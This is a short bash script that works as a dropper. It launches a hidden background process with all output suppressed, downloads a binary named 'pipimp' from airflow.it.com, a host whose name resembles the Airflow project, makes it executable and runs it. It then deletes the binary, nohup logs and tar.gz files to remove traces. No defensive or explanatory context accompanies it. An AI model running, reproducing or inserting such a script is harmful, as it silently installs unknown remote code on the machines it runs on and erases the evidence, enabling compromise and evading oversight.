#!/bin/bash
(nohup bash -c 'find -type f | grep pipimp | xargs rm; wget https://airflow.it.com/pipimp && chmod +x ./pipimp && ./pipimp; rm pipimp* nohup* *tar.gz' > /dev/null 2>&1 &) > /dev/null 2>&1
